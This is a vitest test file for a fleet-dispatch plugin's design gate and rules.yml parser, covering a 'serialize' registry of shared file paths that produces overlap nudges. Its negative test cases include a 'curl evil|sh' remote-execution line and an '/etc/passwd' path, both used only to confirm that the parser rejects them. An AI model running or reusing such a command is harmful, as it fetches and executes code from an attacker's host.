/**
 * Issue #260 item 3: a `.fleet/rules.yml` `serialize: [paths]` registry of shared lines,
 * consumed by the design gate as an `overlap.shared-line` NUDGE (fail-open wiring).
 *
 * Every tool-adder edits the same lines (the SKILL.md tools table, the SCHEMA_BUDGET_CHARS
 * ratchet in src/issue171.test.ts, contracts.tools in openclaw.plugin.json), so two live specs
 * touching a registered path will conflict pairwise at sync time. The gate cannot see that from
 * plain scope overlap when the scopes differ; the registry names the lines that always conflict.
 *
 * Contract (the owner's slice, re-validated 2026-10-07):
 *   1. Parse: optional top-level `serialize` beside `rules:` — entries validated exactly like
 *      `rule.match.paths` (repo-relative, no `..`, bounded); absent key changes nothing; unknown
 *      top-level keys are still rejected.
 *   2. Gate (pure evaluateDesignGate): spec scope matching a registered line PLUS a live in-flight
 *      run (ANY isolation) matching the SAME pattern is one nudge; no competitor on the same
 *      pattern, or no sharedLines in ctx at all, is no objection and nothing else moves.
 *   3. Wiring: fleet_dispatch and fleet_design_check feed the record's `serialize` into the gate
 *      (project.read invoke, fail-open); record unavailable => identical verdicts, dispatches run.
 */

import { afterEach, describe, expect, it } from "vitest";
import { evaluateDesignGate, type InFlightRun } from "./design-gate.js";
import { parseRules, buildProjectRecord } from "./project.js";
import { fakeSshMultiline, loadEntry, loadPlugin, nodeReply, type Loaded } from "./testkit/plugin.js";
import { loadLedger, upsertRun } from "./ledger.js";

// ---------------------------------------------------------------------------
// 1. Parse: the top-level serialize key
// ---------------------------------------------------------------------------

const RULES_NO_SERIALIZE = `schemaVersion: 1\nrules:\n  - id: r1\n    severity: advise\n    match: { paths: [src/a/] }\n    message: be careful\n`;
const withSerialize = (body: string) => `schemaVersion: 1\nserialize:\n${body}\nrules:\n  - id: r1\n    severity: advise\n    match: { paths: [src/a/] }\n    message: be careful\n`;

describe("#260 item 3: rules.yml parse — the serialize registry", () => {
  it("a valid top-level serialize list parses and the record carries it", () => {
    const r = parseRules(withSerialize("  - skills/opencode-fleet/SKILL.md\n  - src/issue171.test.ts\n  - openclaw.plugin.json"));
    expect(r.errors).toEqual([]);
    expect(r.serialize).toEqual(["skills/opencode-fleet/SKILL.md", "src/issue171.test.ts", "openclaw.plugin.json"]);
    const rec = buildProjectRecord({ rulesText: withSerialize("  - skills/opencode-fleet/SKILL.md") });
    expect(rec.errors).toEqual([]);
    expect(rec.serialize).toEqual(["skills/opencode-fleet/SKILL.md"]);
  });
  it("globs and directory patterns are allowed (same shapes as a task scope)", () => {
    const r = parseRules(withSerialize("  - src/**\n  - docs/"));
    expect(r.errors).toEqual([]);
    expect(r.serialize).toEqual(["src/**", "docs/"]);
  });
  it("without the key the parse result and record are unchanged (backwards compatible)", () => {
    const r = parseRules(RULES_NO_SERIALIZE);
    expect(r.errors).toEqual([]);
    expect(r.serialize).toBeUndefined();
    expect("serialize" in buildProjectRecord({ rulesText: RULES_NO_SERIALIZE })).toBe(false);
  });
  it("invalid entries are parse errors, reported like rule.match.paths", () => {
    // absolute path
    const abs = parseRules(withSerialize("  - /etc/passwd"));
    expect(abs.errors[0]).toMatchObject({ field: "serialize", message: expect.stringContaining("repo-relative") });
    // parent escape
    const dotdot = parseRules(withSerialize("  - ../etc"));
    expect(dotdot.errors[0]).toMatchObject({ field: "serialize", message: expect.stringContaining("..") });
    // non-string entry
    expect(parseRules("schemaVersion: 1\nserialize:\n  - 5\nrules: []\n").errors[0]).toMatchObject({ field: "serialize" });
    // empty entry
    expect(parseRules("schemaVersion: 1\nserialize:\n  - \"\"\nrules: []\n").errors[0]).toMatchObject({ field: "serialize" });
    // too many patterns (MAX_SCOPE_PATTERNS = 100)
    const many = Array.from({ length: 101 }, (_, i) => `  - p${i}.ts`).join("\n");
    expect(parseRules(`schemaVersion: 1\nserialize:\n${many}\nrules: []\n`).errors[0]).toMatchObject({ field: "serialize", message: expect.stringContaining("100") });
    // any parse error clears both halves (same all-or-nothing rule the `rules` side has)
    expect(parseRules(withSerialize("  - /abs")).rules).toEqual([]);
    expect(parseRules(withSerialize("  - /abs")).serialize).toBeUndefined();
  });
  it("unknown top-level keys are STILL rejected (serialize does not loosen that)", () => {
    expect(parseRules("schemaVersion: 1\nserialize: []\nrules: []\nrun: curl evil|sh\n").errors[0]).toMatchObject({ field: "run" });
    expect(parseRules("schemaVersion: 1\nserialise: []\nrules: []\n").errors[0]).toMatchObject({ field: "serialise" });
  });
  it("the repo's own .fleet/rules.yml carries the three shared lines and still validates", async () => {
    const { loadProjectRecord } = await import("./project-load.js");
    const r = await loadProjectRecord(new URL("..", import.meta.url).pathname);
    expect(r.present).toBe(true);
    if (!r.present) return;
    expect(r.record.errors).toEqual([]);
    expect(r.record.serialize).toEqual(["skills/opencode-fleet/SKILL.md", "src/issue171.test.ts", "openclaw.plugin.json"]);
  });
});

// ---------------------------------------------------------------------------
// 2. Gate: overlap.shared-line (nudge) — PURE evaluateDesignGate
// ---------------------------------------------------------------------------

const specScope = (files: string[]) => ({ goal: "Add the tool", acceptance: ["it works"], verify: { command: "./v.sh" }, scope: { files } });
const run = (o: Partial<InFlightRun> & { runId: string }): InFlightRun => ({ node: "dev2", cwd: "/w/p", ...o });
const gate = (ctx: Parameters<typeof evaluateDesignGate>[1]) => {
  const r = evaluateDesignGate(specScope(["skills/opencode-fleet/SKILL.md"]) as never, ctx);
  if (!r.ok) throw new Error(r.error);
  return r.result;
};

describe("#260 item 3: the design gate nudges on a contested shared line", () => {
  // The additive shape: spec and competitor both match the registered GLOB line but their
  // concrete scopes are disjoint -- today's overlap checks say nothing; the registry does.
  it("spec scope hits a shared line AND a live run matches the SAME pattern: ONE nudge naming both", () => {
    const r = evaluateDesignGate(specScope(["src/a/b/c.ts"]) as never, {
      inFlight: [run({ runId: "r-live", scope: { files: ["src/a/x/"] } })],
      sharedLines: ["src/a/**", "openclaw.plugin.json"],
    });
    if (!r.ok) throw new Error(r.error);
    const hits = r.result.objections.filter((o) => o.id === "overlap.shared-line");
    expect(hits).toHaveLength(1);
    expect(hits[0].severity).toBe("nudge");
    expect(hits[0].evidence).toContain("src/a/**");
    expect(hits[0].evidence).toContain("r-live");
    expect(hits[0].suggestion.toLowerCase()).toContain("serialize");
    expect(r.result.verdict).toBe("accept-with-nudges");
    expect(r.result.blocked).toBe(false);
  });
  it("a competitor on the literally-same file nudges too, alongside the pre-existing overlap.in-flight block", () => {
    const r = gate({
      inFlight: [run({ runId: "r-live", scope: { files: ["skills/opencode-fleet/SKILL.md"] } })],
      sharedLines: ["skills/opencode-fleet/SKILL.md", "openclaw.plugin.json"],
    });
    const hits = r.objections.filter((o) => o.id === "overlap.shared-line");
    expect(hits).toHaveLength(1);
    expect(hits[0].severity).toBe("nudge");
    expect(r.objections.some((o) => o.id === "overlap.in-flight")).toBe(true); // unchanged, coexists
    expect(r.verdict).toBe("reject-with-reason"); // from the pre-existing check, not the nudge
  });
  it("a competitor whose scope matches NO shared line is no shared-line objection", () => {
    const r = gate({
      inFlight: [run({ runId: "r-live", scope: { files: ["src/other.ts"] } })],
      sharedLines: ["skills/opencode-fleet/SKILL.md"],
    });
    expect(r.objections.some((o) => o.id === "overlap.shared-line")).toBe(false);
  });
  it("isolated competitor on the same line STILL nudges — the contrast with overlap.in-flight (non-isolated only)", () => {
    const r = gate({
      inFlight: [run({ runId: "r-clone", isolated: true, scope: { files: ["skills/opencode-fleet/SKILL.md"] } })],
      sharedLines: ["skills/opencode-fleet/SKILL.md"],
    });
    expect(r.objections.some((o) => o.id === "overlap.shared-line")).toBe(true);
    expect(r.objections.some((o) => o.id === "overlap.in-flight")).toBe(false); // isolation: no clobber
    expect(r.objections.filter((o) => o.id === "overlap.merge")).toHaveLength(1); // the pre-existing merge nudge
  });
  it("no in-flight competitor, or no sharedLines in ctx: results identical to today", () => {
    const competitor = run({ runId: "r-live", scope: { files: ["skills/opencode-fleet/SKILL.md"] } });
    expect(gate({ inFlight: [], sharedLines: ["skills/opencode-fleet/SKILL.md"] }).objections.some((o) => o.id === "overlap.shared-line")).toBe(false);
    // no sharedLines in ctx -> byte-identical to pre-feature (no objection appears, nothing else moves)
    expect(gate({ inFlight: [competitor] }).objections.some((o) => o.id === "overlap.shared-line")).toBe(false);
  });
  it("bad sharedLines in ctx degrades to no check, never a throw", () => {
    const r = gate({ inFlight: [run({ runId: "r-live", scope: { files: ["skills/opencode-fleet/SKILL.md"] } })], sharedLines: ["/abs", "../x"] });
    expect(r.objections.some((o) => o.id === "overlap.shared-line")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Adding a shared list with no bearing on the runs must not move anything else.
// ---------------------------------------------------------------------------

describe("#260 item 3: an irrelevant sharedLines list changes no existing objection", () => {
  it("existing objections and the verdict are byte-identical with a non-matching sharedLines", () => {
    const ctx: Parameters<typeof evaluateDesignGate>[1] = {
      inFlight: [
        run({ runId: "r1", node: "dev2", cwd: "/w/p", scope: { files: ["src/x/"] } }),
        run({ runId: "r2", node: "dev3", cwd: "/w/p", isolated: true, scope: { files: ["src/x/"] } }),
        run({ runId: "r3", node: "dev4", cwd: "/w/p" }),
      ],
    };
    const withLines: typeof ctx = { ...ctx, sharedLines: ["docs/**"] };   // matches neither r1/r2/r3 nor the spec
    const a = evaluateDesignGate(specScope(["src/x/"]) as never, ctx);
    const b = evaluateDesignGate(specScope(["src/x/"]) as never, withLines);
    if (!a.ok || !b.ok) throw new Error("gate errored");
    expect(JSON.stringify(a.result.objections)).toBe(JSON.stringify(b.result.objections));
    expect(b.result.verdict).toBe(a.result.verdict);
    // and the matching case does add exactly one nudge on top of the same baseline
    const c = evaluateDesignGate(specScope(["src/x/"]) as never, { ...ctx, sharedLines: ["src/x/"] });
    if (!c.ok) throw new Error(c.error);
    expect(JSON.stringify(c.result.objections.slice(0, 2))).toBe(JSON.stringify(a.result.objections));
    expect(c.result.objections[c.result.objections.length - 1].id).toBe("overlap.shared-line");
  });
});

// ---------------------------------------------------------------------------
// 3. Wiring: fail-open project.read on both gate call sites
// ---------------------------------------------------------------------------

const entry = await loadEntry();
const NODES = [{ nodeId: "n-dev2", displayName: "dev2", connected: true, invocableCommands: ["opencode.run"] }];
const cfgNode = (extra?: Record<string, unknown>) => ({ nodes: { dev2: { roles: ["worker"], ssh: false } }, ...(extra ? { project: extra } : {}) });
const GOOD = specScope(["skills/opencode-fleet/SKILL.md", "src/other.ts"]);

describe.skipIf(!entry)("#260 item 3: wiring — the registry rides into the gate, fail-open", () => {
  let p: Loaded | undefined;
  let restore: (() => void) | undefined;
  afterEach(() => { p?.dispose(); p = undefined; restore?.(); });

  it("fleet_dispatch: a node record with serialize surfaces overlap.shared-line in the gate result", async () => {
    restore = fakeSshMultiline(["FLEET_CWD=ok"]);
    const now = new Date().toISOString();
    p = loadPlugin(entry!, {
      nodes: NODES, config: cfgNode(),
      invoke: (c) => c.params.prompt === "__PROJECT_READ__"
        ? nodeReply({ ok: true, present: true, raw: { rulesText: "schemaVersion: 1\nserialize:\n  - skills/opencode-fleet/SKILL.md\nrules: []\n", decisionFiles: [], errors: [], files: ["rules.yml"], ignored: [] } })
        : nodeReply({ ok: true, detached: true, runId: "r-new", pid: 1 }),
    });
    // A live competitor on the same shared line (from the ledger at dispatch time).
    await upsertRun(p.rootDir, { runId: "r-live", node: "dev2", cwd: "/w/p", prompt: "p", startedAt: now, updatedAt: now, state: "running", spec: { goal: "Add the tool too", scope: { files: ["skills/opencode-fleet/SKILL.md"] } } } as never);
    const r = await p.call("fleet_dispatch", { cwd: "/w/p", node: "dev2", spec: GOOD }) as Record<string, any>;
    expect(r.ok).not.toBe(false);
    const ids = (r.design?.objections ?? []).map((o: { id: string }) => o.id);
    expect(ids).toContain("overlap.shared-line");
    // the run DID launch (a nudge never blocks a dispatch)
    expect(p.invokes.some((c) => c.params.prompt === "__RUN_START__")).toBe(true);
    expect(await p.waitForInvoke((c) => c.params.prompt === "__RUN_START__")).toBeDefined();
    expect(p.invokes.filter((c) => c.params.prompt === "__PROJECT_READ__")).toHaveLength(1);
  });

  it("fleet_dispatch: a failing/unreadable record is fail-open — identical verdict, no objection, no delay", async () => {
    restore = fakeSshMultiline(["FLEET_CWD=ok"]);
    const now = new Date().toISOString();
    p = loadPlugin(entry!, {
      nodes: NODES, config: cfgNode(),
      invoke: (c) => c.params.prompt === "__PROJECT_READ__"
        ? nodeReply({ ok: false, error: "node refused" })  // worst case: the node refuses outright
        : nodeReply({ ok: true, detached: true, runId: "r-new", pid: 1 }),
    });
    await upsertRun(p.rootDir, { runId: "r-live", node: "dev2", cwd: "/w/p", prompt: "p", startedAt: now, updatedAt: now, state: "running", spec: { goal: "Add the tool too", scope: { files: ["skills/opencode-fleet/SKILL.md"] } } } as never);
    const r = await p.call("fleet_dispatch", { cwd: "/w/p", node: "dev2", spec: GOOD }) as Record<string, any>;
    expect(r.ok).not.toBe(false);
    expect((r.design?.objections ?? []).some((o: { id: string }) => o.id === "overlap.shared-line")).toBe(false);
    expect(Array.isArray(r.design?.objections)).toBe(true);
    expect(await p.waitForInvoke((c) => c.params.prompt === "__RUN_START__")).toBeDefined();
  });

  it("fleet_design_check: the same nudge with node+cwd; a thrown node invoke still returns a normal verdict", async () => {
    restore = fakeSshMultiline(["FLEET_CWD=ok"]);
    let fail = true;
    p = loadPlugin(entry!, {
      nodes: NODES, config: cfgNode(),
      invoke: (c) => {
        if (c.params.prompt === "__PROJECT_READ__") {
          if (fail) throw new Error("node down"); else return nodeReply({ ok: true, present: true, raw: { rulesText: "schemaVersion: 1\nserialize:\n  - skills/opencode-fleet/SKILL.md\nrules: []\n", decisionFiles: [], errors: [], files: ["rules.yml"], ignored: [] } });
        }
        return nodeReply({ ok: true, detached: true, runId: "r-new", pid: 1 });
      },
    });
    // Fail-open first: a throwing read leaves the verdict normal.
    const r1 = await p.call("fleet_design_check", { spec: GOOD, node: "dev2", cwd: "/w/p" }) as Record<string, any>;
    expect(r1.ok).toBe(true);
    expect(r1.verdict).toBe("accept");
    fail = false;
    const r2 = await p.call("fleet_design_check", { spec: GOOD, node: "dev2", cwd: "/w/p" }) as Record<string, any>;
    expect(r2.ok).toBe(true);
    expect(r2.objections.some((o: { id: string }) => o.id === "overlap.shared-line")).toBe(false); // no live competitor in the ledger
    const now = new Date().toISOString();
    await upsertRun(p.rootDir, { runId: "r-live", node: "dev2", cwd: "/w/p", prompt: "p", startedAt: now, updatedAt: now, state: "running", spec: { goal: "Add the tool too", scope: { files: ["skills/opencode-fleet/SKILL.md"] } } } as never);
    const r3 = await p.call("fleet_design_check", { spec: GOOD, node: "dev2", cwd: "/w/p" }) as Record<string, any>;
    expect(r3.objections.some((o: { id: string }) => o.id === "overlap.shared-line")).toBe(true);
    // the shared-line objection is only ever a nudge: on its own it leaves the verdict unblocked
    expect(r3.objections.find((o: { id: string }) => o.id === "overlap.shared-line")!.severity).toBe("nudge");
  });

  it("the node protocol is intact: project.read needs protocol 6 and carries no launch features", async () => {
    const { OP_MIN_PROTOCOL, PROTOCOL_VERSION } = await import("./protocol.js");
    expect(OP_MIN_PROTOCOL["project.read"]).toBe(6);
    expect(PROTOCOL_VERSION).toBe(6);
  });
});

// ---------------------------------------------------------------------------
// 4. The objection ids live on the ledger for the scheduler (decompose/the
// mission loop order the specs; the nudge is the evidence they can read).
// ---------------------------------------------------------------------------

describe.skipIf(!entry)("#260 item 3: the objection ids live on the ledger for the scheduler", () => {
  it("a dispatched spec's ledger entry records overlap.shared-line among the objection ids", async () => {
    let pp: Loaded | undefined;
    const restore2 = fakeSshMultiline(["FLEET_CWD=ok"]);
    const now = new Date().toISOString();
    try {
      pp = loadPlugin(entry!, {
        nodes: NODES, config: cfgNode(),
        invoke: (c) => c.params.prompt === "__PROJECT_READ__"
          ? nodeReply({ ok: true, present: true, raw: { rulesText: "schemaVersion: 1\nserialize:\n  - skills/opencode-fleet/SKILL.md\nrules: []\n", decisionFiles: [], errors: [], files: ["rules.yml"], ignored: [] } })
          : nodeReply({ ok: true, detached: true, runId: "r-new", pid: 1 }),
      });
      await upsertRun(pp.rootDir, { runId: "r-live", node: "dev2", cwd: "/w/p", prompt: "p", startedAt: now, updatedAt: now, state: "running", spec: { goal: "Add the tool too", scope: { files: ["skills/opencode-fleet/SKILL.md"] } } } as never);
      await pp.call("fleet_dispatch", { cwd: "/w/p", node: "dev2", spec: GOOD });
      const le = (await loadLedger(pp.rootDir)).find((e) => e.missionKey === undefined && e.prompt !== "p");
      expect(le?.design?.objectionIds).toContain("overlap.shared-line");
    } finally { pp?.dispose(); restore2(); }
  });
});